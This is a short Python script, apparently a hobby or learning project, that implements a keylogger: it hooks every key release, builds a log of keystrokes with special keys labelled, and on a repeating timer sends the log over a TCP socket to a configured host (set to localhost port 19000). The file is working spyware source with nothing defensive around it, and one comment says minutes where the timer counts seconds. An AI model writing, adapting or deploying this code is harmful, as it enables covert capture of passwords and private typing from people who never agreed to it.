import keyboard
import socket
from threading import Semaphore, Timer

REPORT_CYCLE = 10 # 10 minutes

class Keylogger:
    def __init__(self, interval):
        self.interval = interval # REPORT_CYCLE will be passed to interval
        #self.log is string with the log of keystrokes in the interval
        self.log = ""
        #Semaphore blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    #callback is invoked whenever a keyboard event is occured
    #ie a key is released
    def callback(self, event):
        name = event.name

        #if len name > 1 then its not a charactar
        #special key (cntrl, alt, ...)
        if len(name) > 1:
            if name == "space":
                #change space to " "
                name = " "
            elif name == "enter":
                name = "[ENTER} \n"
            elif name == "decimal":
                name = "."
            else:
                #replace w underscore
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
                
        self.log += name

    def send_sock(self, message):
    	send_data = str.encode(message)
    	s.sendall(send_data)
    	print('data sent')
    	dataRecieved = s.recv(1024)
    	print(repr(dataRecieved))

    def report(self):
        #if theres something in the log, report it
        #using sockets
        if self.log:
            print("report: ")
            print(self.log)
            self.send_sock(self.log)
        self.log = ""
        Timer(interval = self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)

        self.report()
        self.semaphore.acquire()

if __name__ == "__main__":
    HOST = '127.0.0.1'
    PORT = 19000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    keylogger = Keylogger(REPORT_CYCLE)
    keylogger.start()
